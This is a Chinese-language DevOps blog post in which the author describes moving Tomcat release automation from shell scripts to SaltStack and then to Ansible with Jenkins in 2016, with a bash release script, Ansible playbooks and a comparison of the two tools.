&lt;p&gt;一开始开始深度学习的是SaltStack所以掌握的比较深更加熟练，其实也是一个好朋友推荐我看了一本书&lt;code&gt;python入门到精通&lt;/code&gt; 里面有详细讲到salt安装和使用部署自动化各种操作，的确很方便。后面在测试环境我自己管理几十台服务器－学习使用&lt;code&gt;Ansible&lt;/code&gt;去操作，因为salt跟ansible最大的区别，除了ansible快速上手和不需要复杂的安装，主要在内网方面比salt更稳定架构也比salt好。&lt;/p&gt;
&lt;p&gt;在线上我们都是用salt去操作的，可是当时公司还没有运维开发的人员，所以后来salt在终端操作出了很多错：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;第一：人员操作失误一次，可能会导致所有的服务器都会受影响。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;第二：命令太多服务权限需要一一统一分配登陆终端操作。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那时候服务器有500多台那时候运维操作起来还是挺费力的。 &lt;/p&gt;
&lt;h3 id=&quot;经历：&quot;&gt;&lt;a href=&quot;#经历：&quot; class=&quot;headerlink&quot; title=&quot;经历：&quot;&gt;&lt;/a&gt;经历：&lt;/h3&gt;&lt;p&gt;2016年初3月份去参加360的一次运维大会，王浩宇360的运维开发人员分享了一片文章：&lt;code&gt;大规模集群上的多业务线环境部署.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;讲的非常好，用的是Puppet去实现3000多台的服务器部署，指定部署安装包等等。非常方便。&lt;/p&gt;
&lt;p&gt;这里也在Infoq上面有他的分享作品我这里粘贴出来了：&lt;a href=&quot;http://www.infoq.com/cn/articles/multi-service-line-environment-deployment&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;大规模集群上的多业务线环境部署&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;个人现在运维自动化演变过程经验：&quot;&gt;&lt;a href=&quot;#个人现在运维自动化演变过程经验：&quot; class=&quot;headerlink&quot; title=&quot;个人现在运维自动化演变过程经验：&quot;&gt;&lt;/a&gt;个人现在运维自动化演变过程经验：&lt;/h4&gt;&lt;p&gt;我现在在一家上市公司旗下控股医疗大数据子公司负责运维部门，负责IT网络安全办公：主要做的应用运维和网络运维，兼大数据运维。&lt;/p&gt;
&lt;p&gt;第一个版本公司整体服务架构：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/yjkjiagoutu.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;2016年2月份脚本形式自动化发布：&quot;&gt;&lt;a href=&quot;#2016年2月份脚本形式自动化发布：&quot; class=&quot;headerlink&quot; title=&quot;2016年2月份脚本形式自动化发布：&quot;&gt;&lt;/a&gt;2016年2月份脚本形式自动化发布：&lt;/h4&gt;&lt;p&gt;16年2月份这里的Tomcat自动化 发布我一开始使用shell脚本去实现自动化发布和回滚。 &lt;/p&gt;
&lt;h4 id=&quot;2016年4月份salt自动化远程控制脚本发布：&quot;&gt;&lt;a href=&quot;#2016年4月份salt自动化远程控制脚本发布：&quot; class=&quot;headerlink&quot; title=&quot;2016年4月份salt自动化远程控制脚本发布：&quot;&gt;&lt;/a&gt;2016年4月份salt自动化远程控制脚本发布：&lt;/h4&gt;&lt;p&gt;16年4月份这里的tomcat服务增多，发现脚本发布手工操作太繁琐，而且出现问题几率大，效率不高。每次一次大版本改动发布会出现很多问题。&lt;/p&gt;
&lt;p&gt;这里跟随服务模块增多，现在服务器90多台，统一salt自动化调用每台对应脚本发布回滚。&lt;/p&gt;
&lt;p&gt;这里贴上我写的salt结合调用脚本命令，写在发布机器上面。这样就不需要进入机器每台执行对应发布脚本。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#author chengyangyang&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#2016年5月25日&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#this script is only for CentOS 6&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#check the OS&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#This script is used for the project release, which needs to be run by the root user&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;platform=`uname -i`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;variable&quot;&gt;$platform&lt;/span&gt; != &lt;span class=&quot;string&quot;&gt;&quot;x86_64&quot;&lt;/span&gt; ];&lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;this script is only for 64bit Operating System !&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;the platform is ok&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;version=`cat /etc/redhat-release |awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print substr($3,1,1)&amp;#125;&#39;&lt;/span&gt;`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;variable&quot;&gt;$version&lt;/span&gt; != 6 ];&lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;this script is only for CentOS 6 !&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat &amp;lt;&amp;lt; EOF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+----------------------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|   your system is CentOS 6 x86_64       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|   start Update release tomcat.......   |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+----------------------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;EOF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#To determine whether the root permissions&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$UID&lt;/span&gt;&quot;&lt;/span&gt; != &lt;span class=&quot;string&quot;&gt;&#39;0&#39;&lt;/span&gt; ]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Permission denied, please switch the root tomcat.&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&quot;curl -O  http://10.47.100.90/ihaozhuo/war/haozhuo-tomcat.war&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&quot;md5sum haozhuo-tomcat.war&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&quot;mv haozhuo-tomcat.war java_war/&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&quot;sh /root/update/tomcat.sh&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&#39;node&#39;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&#39;/etc/init.d/tomcat-tomcat stop&#39;&lt;/span&gt; env=&lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;&quot;LC_ALL&quot;: &quot;zh_CN.UTF-8&quot;&amp;#125;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&#39;node&#39;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&#39;/etc/init.d/tomcat-tomcat start&#39;&lt;/span&gt; env=&lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;&quot;LC_ALL&quot;: &quot;zh_CN.UTF-8&quot;&amp;#125;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;2016年5月份去除了salt替换更新Ansible-Jenkins-Maven＋Nginx搞定自动发布，构建程序的持续集成平台&quot;&gt;&lt;a href=&quot;#2016年5月份去除了salt替换更新Ansible-Jenkins-Maven＋Nginx搞定自动发布，构建程序的持续集成平台&quot; class=&quot;headerlink&quot; title=&quot;2016年5月份去除了salt替换更新Ansible + Jenkins+Maven＋Nginx搞定自动发布，构建程序的持续集成平台&quot;&gt;&lt;/a&gt;2016年5月份去除了salt替换更新Ansible + Jenkins+Maven＋Nginx搞定自动发布，构建程序的持续集成平台&lt;/h4&gt;&lt;h4 id=&quot;Ansible-vs-SaltStack-对比？&quot;&gt;&lt;a href=&quot;#Ansible-vs-SaltStack-对比？&quot; class=&quot;headerlink&quot; title=&quot;Ansible vs SaltStack 对比？&quot;&gt;&lt;/a&gt;Ansible vs SaltStack 对比？&lt;/h4&gt;&lt;h6 id=&quot;1-自身运维&quot;&gt;&lt;a href=&quot;#1-自身运维&quot; class=&quot;headerlink&quot; title=&quot;1. 自身运维&quot;&gt;&lt;/a&gt;1. 自身运维&lt;/h6&gt;&lt;p&gt;&lt;code&gt;SaltStack&lt;/code&gt;需要在&lt;code&gt;Master和Minion&lt;/code&gt;主机启动守护进程，自身需要检测守护进程的运行状态，增加运维成本。Ansible和远端主机之间的通信是通过标准SSH进行，远程主机上只需要运行SSH进程就可以进行运维操作，SSH是机房主机中一般都安装和启动的进程，所以在Ansible进行运维的时候只需要关注Ansible主机的运行状态。Ansible对机房运维不会增加过多的运维成本。从工具本身的运维角度来说，&lt;code&gt;Ansible&lt;/code&gt;要比SaltStack简单很多。&lt;/p&gt;
&lt;h6 id=&quot;2-使用语法&quot;&gt;&lt;a href=&quot;#2-使用语法&quot; class=&quot;headerlink&quot; title=&quot;2. 使用语法&quot;&gt;&lt;/a&gt;2. 使用语法&lt;/h6&gt;&lt;p&gt;&lt;code&gt;Ansible&lt;/code&gt;的&lt;code&gt;Playbook&lt;/code&gt;语法要比SaltStack的State语法具有更好的可读性。在使用的过程中发现&lt;code&gt;Ansible&lt;/code&gt;在实现loop的更加的简洁，也可以使用相对路径。&lt;/p&gt;
&lt;p&gt;同样Ansible的Notify模块和Handler模块实现的功能和SaltStack的watch和module.wait的模块实现功能也类似，也比SaltStack要简洁明了。&lt;/p&gt;
&lt;p&gt;总之，&lt;code&gt;Ansible的安全性能比SaltStack好&lt;/code&gt;，自身运维简单，使用语法可读性更强，虽然在响应速度方面不如SaltStack，但是在大部分应用场景下Ansible的响应速度能满足需求。因此，在金融行业的自动化运维系统，Ansible工具是最好的选择。&lt;/p&gt;
&lt;p&gt;对应模块 account.yml 在Jenkins自动化写上变量对应.yml前缀名称。&lt;br&gt;这里依然调用脚本去跑。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- hosts: tomcat-account_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  environment:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    LC_ALL: zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    LANG : zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name  : cpfile-account&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    copy  : src=/root/.jenkins/workspace/yjk_master/haozhuo/haozhuo-account/target/haozhuo-account.war dest=/root/java_war/haozhuo-account.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name  : restart&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell : /root/update/account.sh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async : 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name  : shutdown&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell : /srv/tomcat/tomcat_account/bin/shutdown.sh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async : 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name  : start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell : &lt;span class=&quot;built_in&quot;&gt;chdir&lt;/span&gt;=/srv/tomcat/tomcat_account/bin nohup ./startup.sh &amp;amp;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async : 0&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;2016年6月份在ansible改进yml代码语法。去除了每台服务器新增发布脚本，这个过程太过于复杂，统一一台发布机处理即可。&quot;&gt;&lt;a href=&quot;#2016年6月份在ansible改进yml代码语法。去除了每台服务器新增发布脚本，这个过程太过于复杂，统一一台发布机处理即可。&quot; class=&quot;headerlink&quot; title=&quot;2016年6月份在ansible改进yml代码语法。去除了每台服务器新增发布脚本，这个过程太过于复杂，统一一台发布机处理即可。&quot;&gt;&lt;/a&gt;2016年6月份在ansible改进yml代码语法。去除了每台服务器新增发布脚本，这个过程太过于复杂，统一一台发布机处理即可。&lt;/h4&gt;&lt;p&gt;这里我贴出yml代码 Jenkins直接调用相应模块发布，自然会去执行对应yml代码。每台服务器不需要放发布回滚脚本。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- hosts: all&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  environment:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     LC_ALL: zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     LANG : zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  vars:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#jenkins-打包目录&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    TESTWAR: /root/java_war/haozhuo-family.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#生产环境中项目的tomcat所在的位置&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#生产环境中老版本项目所在webapps备份目录的位置&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    backupwebapps: /srv/tomcat/tomcat_family/warbackup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#从jenkins-打包环境获取的新版本war包所在的位置&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NEWWAR: /root/java_war/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#生产环境中项目war包的名字&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WARNAME: haozhuo-family.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#kill服务type路径&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DOWNFILE: /srv/tomcat/tomcat_family&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: copy-war-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    copy: src=&amp;#123;&amp;#123; TESTWAR &amp;#125;&amp;#125; dest=&amp;#123;&amp;#123; NEWWAR &amp;#125;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: mkdir-bakwar-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    file: path=&amp;#123;&amp;#123; backupwebapps &amp;#125;&amp;#125; state=directory owner=tomcat group=tomcat mode=755&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: bakwar-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;string&quot;&gt;&quot;cp -r &amp;#123;&amp;#123; OLDHOME &amp;#125;&amp;#125; &amp;#123;&amp;#123; backupwebapps &amp;#125;&amp;#125;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: unzip war.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    unarchive: src=&amp;#123;&amp;#123; NEWWAR &amp;#125;&amp;#125;/&amp;#123;&amp;#123; WARNAME &amp;#125;&amp;#125; dest=&amp;#123;&amp;#123; OLDHOME &amp;#125;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: stop-tomcat-service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;string&quot;&gt;&quot;ps -ef |grep &amp;#123;&amp;#123; DOWNFILE &amp;#125;&amp;#125; |grep -v grep |awk &#39;&amp;#123;print &lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt;&amp;#125;&#39; |xargs kill -9&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ignore_errors: yes&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async: 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: start-tomcat-service-nohup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;built_in&quot;&gt;chdir&lt;/span&gt;=&amp;#123;&amp;#123; DOWNFILE &amp;#125;&amp;#125;/bin nohup ./startup.sh &amp;amp;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&quot;3-总结&quot;&gt;&lt;a href=&quot;#3-总结&quot; class=&quot;headerlink&quot; title=&quot;3. 总结&quot;&gt;&lt;/a&gt;3. 总结&lt;/h6&gt;&lt;p&gt;在金融领域中，安全是最重要的考虑因素，在众多自动化运维工具种，Ansible的安全性能最好，是目前最适合金融领域的自动化运维工具。本文通过将Ansible微服务化，集成到自动化运维平台中，实现自动化运维平台高并发执行运维操作场景和实时收集执行结果。&lt;/p&gt;
&lt;h4 id=&quot;2016年7月份Jenkins上面实现持续集成&quot;&gt;&lt;a href=&quot;#2016年7月份Jenkins上面实现持续集成&quot; class=&quot;headerlink&quot; title=&quot;2016年7月份Jenkins上面实现持续集成&quot;&gt;&lt;/a&gt;2016年7月份Jenkins上面实现持续集成&lt;/h4&gt;&lt;p&gt;这里Jenkins打通gitlab自动发布，审计代码。 这里结合&lt;code&gt;openVPN+谷歌二次动态认证&lt;/code&gt;效果给予开发他们开放环境。&lt;br&gt;架构图 ：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/yjkjiagoutu2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
